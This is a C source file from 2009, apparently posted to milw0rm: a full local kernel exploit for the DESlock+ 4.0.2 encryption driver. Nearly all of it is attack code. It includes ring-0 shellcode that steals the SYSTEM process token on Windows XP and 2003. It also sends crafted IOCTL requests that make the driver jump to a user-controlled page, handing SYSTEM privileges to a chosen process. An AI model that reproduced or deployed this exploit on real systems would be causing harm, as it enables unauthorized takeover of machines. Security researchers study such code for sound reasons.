/* deslock-dlpcrypt.c
 *
 * Copyright (c) 2009 by <mu-b@digit-labs.org>
 *
 * DESlock+ 4.0.2 local kernel SYSTEM exploit
 * by mu-b - Thu 18 Jun 2009
 *
 * - Tested on: dlpcrypt.sys 0.1.1.27
 *
 * .text:0001BB2E: 'what do ya want for nothing?'
 *  - hmmm, something that doesn't pass kernel mode pointers
 *    between kernel and userland?
 *
 * Compile: MinGW + -lntdll
 *
 *    - Private Source Code -DO NOT DISTRIBUTE -
 * http://www.digit-labs.org/ -- Digit-Labs 2009!@$!
 */

#include <stdio.h>
#include <stdlib.h>

#include <windows.h>

#define DLPCRYPT_IOCTL_ENABLED  0x8001200C
#define DLPCRYPT_IOCTL_ADD      0x80012004
#define DLPCRYPT_IOCTL_PROCESS  0x80012010

#define DLPCRYPT_FLAG1          0x13B45FA8
#define DLPCRYPT_FLAG2          0xBFD294C9

static unsigned char win32_fixup[] =
  "\x56";

/* Win2k3 SP1/2 - kernel EPROCESS token switcher
 * by mu-b <mu-b@digit-lab.org>
 */
static unsigned char win2k3_ring0_shell[] =
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\xb0\x18\x02\x00\x00"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"

  /* _cmd_eprocess_loop   */
  "\x8b\x98\x94\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x9c\x00\x00\x00"
  "\x2d\x98\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  "\x8b\x89\xd8\x00\x00\x00"
  "\x89\x88\xd8\x00\x00\x00"
  "\x90";

static unsigned char winxp_ring0_shell[] =
  /* _ring0 */
  "\xb8\x24\xf1\xdf\xff"
  "\x8b\x00"
  "\x8b\x70\x44"
  "\x89\xf0"
  /* _sys_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x04\x00\x00\x00"
  "\x74\x11"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  "\xeb\x21"
  /* _sys_eprocess_found  */
  "\x89\xc1"
  "\x89\xf0"

  /* _cmd_eprocess_loop   */
  "\x8b\x98\x84\x00\x00\x00"
  "\x81\xfb\x00\x00\x00\x00"
  "\x74\x10"
  "\x8b\x80\x8c\x00\x00\x00"
  "\x2d\x88\x00\x00\x00"
  "\x39\xf0"
  "\x75\xe3"
  /* _not_found           */
  "\xcc"
  /* _cmd_eprocess_found
   * _ring0_end           */

  /* copy tokens!$%!      */
  "\x8b\x89\xc8\x00\x00\x00"
  "\x89\x88\xc8\x00\x00\x00"
  "\x90";

static unsigned char win32_ret[] =
  "\x5e"
  "\x58"
  "\x58"
  "\x33\xc0"
  "\x5e"
  "\x5d"
  "\xc2\x0c\x00";

struct ioctl_req_enable {
  int flag[2];
  int len;
  int result;
  int enabled;
  char pad[0x38 - 0x14];
};

struct ioctl_req {
  int flag[2];
  int len;
  int result;
  int action;
  struct ioctl_ptr *ptr;
  char pad[0x38 - 0x18];
};

struct ioctl_ptr {
  char pad[0x8];
  struct ioctl_pid *ppid;
  int action;
  char _pad[0x4];
  struct ioctl_func *func;
};

struct ioctl_pid {
  char pad[0x14];
  DWORD pid;
};

struct ioctl_func {
  void *func_ptr;
};

static PCHAR
fixup_ring0_shell (DWORD ppid, DWORD *zlen)
{
  DWORD dwVersion, dwMajorVersion, dwMinorVersion;

  dwVersion = GetVersion ();
  dwMajorVersion = (DWORD) (LOBYTE(LOWORD(dwVersion)));
  dwMinorVersion = (DWORD) (HIBYTE(LOWORD(dwVersion)));

  if (dwMajorVersion != 5)
    {
      fprintf (stderr, "* GetVersion, unsupported version\n");
      exit (EXIT_FAILURE);
    }

  switch (dwMinorVersion)
    {
      case 1:
        *zlen = sizeof winxp_ring0_shell - 1;
        *(PDWORD) &winxp_ring0_shell[55] = ppid;
        return (winxp_ring0_shell);

      case 2:
        *zlen = sizeof win2k3_ring0_shell - 1;
        *(PDWORD) &win2k3_ring0_shell[58] = ppid;
        return (win2k3_ring0_shell);

      default:
        fprintf (stderr, "* GetVersion, unsupported version\n");
        exit (EXIT_FAILURE);
    }

  return (NULL);
}

int
main (int argc, char **argv)
{
  struct ioctl_req_enable req_enable;
  struct ioctl_req req;
  struct ioctl_ptr ptr;
  struct ioctl_pid pid;
  struct ioctl_func func;
  LPVOID c_addr, zpage, zbuf;
  DWORD rlen, zlen, ppid;
  HANDLE hFile;
  BOOL bResult;

  printf ("DESlock+ 4.0.2 local kernel SYSTEM exploit\n"
          "by: <mu-b@digit-labs.org>\n"
          "http://www.digit-labs.org/ -- Digit-Labs 2009!@$!\n\n");

  if (argc <= 1)
    {
      fprintf (stderr, "Usage: %s <processid to elevate>\n", argv[0]);
      exit (EXIT_SUCCESS);
    }

  ppid = atoi (argv[1]);

  hFile = CreateFileA ("\\\\.\\DLPCryptCore", FILE_EXECUTE,
                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
                       OPEN_EXISTING, 0, NULL);
  if (hFile == INVALID_HANDLE_VALUE)
    {
      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
      exit (EXIT_FAILURE);
    }

  zpage = VirtualAlloc (NULL, 0x10000, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  if (zpage == NULL)
    {
      fprintf (stderr, "* VirtualAlloc failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("* allocated page: 0x%08X [%d-bytes]\n",
          zpage, 0x10000);

  memset (zpage, 0xCC, 0x10000);
  zbuf = fixup_ring0_shell (ppid, &zlen);
  memcpy (zpage, win32_fixup, sizeof (win32_fixup) - 1);
  memcpy (zpage + sizeof (win32_fixup) - 1, zbuf, zlen);
  memcpy (zpage + sizeof (win32_fixup) + zlen - 1,
          win32_ret, sizeof (win32_ret) - 1);

  memset (&req_enable, 0, sizeof req_enable);
  req_enable.flag[0] = DLPCRYPT_FLAG1;
  req_enable.flag[1] = DLPCRYPT_FLAG2;
  req_enable.len = sizeof req_enable;

  printf ("* verifying context... ");
  bResult = DeviceIoControl (hFile, DLPCRYPT_IOCTL_ENABLED,
                             &req_enable, sizeof req_enable,
                             &req_enable, sizeof req_enable, &rlen, 0);
  if (!bResult)
    {
      fprintf (stderr, "* DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("result: %d, enabled: %d\n", req_enable.result, req_enable.enabled);

  printf ("* adding pid [%d]... ", GetCurrentProcessId ());
  bResult = DeviceIoControl (hFile, DLPCRYPT_IOCTL_ADD,
                             &req_enable, sizeof req_enable,
                             &req_enable, sizeof req_enable, &rlen, 0);
  if (!bResult)
    {
      fprintf (stderr, "* DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("done\n");

  memset (&req, 0, sizeof req);
  req.flag[0] = DLPCRYPT_FLAG1;
  req.flag[1] = DLPCRYPT_FLAG2;
  req.len = sizeof req;
  req.action = 2;
  req.ptr = &ptr;

  memset (&ptr, 0, sizeof ptr);
  ptr.ppid = &pid;
  ptr.action = 2;
  ptr.func = &func;

  memset (&pid, 0, sizeof pid);
  pid.pid = GetCurrentProcessId ();

  memset (&func, 0, sizeof func);
  func.func_ptr = &c_addr;

  c_addr = (LPVOID) zpage;

  printf ("* req.ptr: 0x%08X\n", &ptr);
  printf ("* @0x%08X: ppid_ptr: 0x%08X, func_ptr:  0x%08X\n",
          &ptr, ptr.ppid, ptr.func);
  printf ("* @0x%08X: func_ptr: 0x%08X\n", ptr.func, func.func_ptr);
  printf ("* @0x%08X: func_ptr: 0x%08X\n", &c_addr, c_addr);

  /* jump to our address :) */
  printf ("* jumping.. ");
  bResult = DeviceIoControl (hFile, DLPCRYPT_IOCTL_PROCESS,
                             &req, sizeof req, &req, sizeof req, &rlen, 0);
  if (!bResult)
    {
      fprintf (stderr, "* DeviceIoControl failed\n");
      exit (EXIT_FAILURE);
    }
  printf ("done\n\n"
          "* hmmm, you didn't STOP the box?!?!\n");

  CloseHandle (hFile);

  return (EXIT_SUCCESS);
}

// milw0rm.com [2009-06-18]